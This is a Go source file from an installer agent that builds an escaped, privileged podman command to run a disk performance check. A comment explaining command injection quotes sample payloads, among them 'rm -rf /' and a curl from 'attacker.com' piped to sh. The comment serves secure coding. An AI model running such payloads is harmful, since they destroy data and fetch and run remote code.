package actions

import (
	"fmt"
	"strconv"

	"github.com/alessio/shellescape"
	log "github.com/sirupsen/logrus"

	"github.com/openshift/assisted-installer-agent/src/config"
	"github.com/openshift/assisted-installer-agent/src/util"
	"github.com/openshift/assisted-service/models"
)

type diskPerfCheck struct {
	args        []string
	agentConfig *config.AgentConfig
}

func (a *diskPerfCheck) Validate() error {
	modelToValidate := models.DiskSpeedCheckRequest{}
	err := ValidateCommon("disk performance", 2, a.args, &modelToValidate)
	if err != nil {
		return err
	}
	if _, err := strconv.ParseFloat(a.args[1], 64); err != nil {
		log.WithError(err).Errorf("Failed to parse timeout value to float: %s", a.args[1])
		return err
	}

	return nil
}

func (a *diskPerfCheck) Command() string {
	return "sh"
}

func (a *diskPerfCheck) Args() []string {
	// Build podman command as a slice and escape it to prevent command injection
	podmanRunCmd := []string{
		"timeout", a.args[1],
		podman, "run",
		"--privileged", "--rm", "--quiet",
		"-v", "/dev:/dev:rw",
		"-v", "/var/log:/var/log",
		"-v", "/run/systemd/journal/socket:/run/systemd/journal/socket",
		"--name", "disk_performance",
		a.agentConfig.AgentVersion,
		"disk_speed_check",
		a.args[0], // Device path - properly escaped by shellescape.QuoteCommand
	}

	// SECURITY: All arguments passed to shell commands MUST be escaped using shellescape.
	// This prevents command injection attacks (CWE-78) where malicious input like:
	//   - "; rm -rf /" (command chaining)
	//   - "$(curl attacker.com/shell.sh | sh)" (command substitution)
	//   - "`id`" (backtick execution)
	// could be executed if concatenated directly into command strings.
	// Never concatenate user-controlled values directly into command strings.
	escapedCmd := shellescape.QuoteCommand(podmanRunCmd)

	// Check if container is already running before starting a new one.
	// If a container named "disk_performance" is already running, we output a sentinel message
	// and exit with code 0. This allows callers to distinguish between:
	// 1. A successful disk speed check (actual metrics returned)
	// 2. A skipped check because container was already running (sentinel message returned)
	// Without this sentinel, callers would receive empty stdout with exit code 0, making
	// the "already running" case indistinguishable from other edge cases.
	checkAlreadyRunningCmd := "id=`podman ps --quiet --filter \"name=disk_performance\"` ; test ! -z \"$id\" && echo 'disk_performance:already_running'"

	return []string{"-c", fmt.Sprintf("%s || %s", checkAlreadyRunningCmd, escapedCmd)}
}

func (a *diskPerfCheck) Run() (stdout, stderr string, exitCode int) {
	return util.ExecutePrivileged(a.Command(), a.Args()...)
}
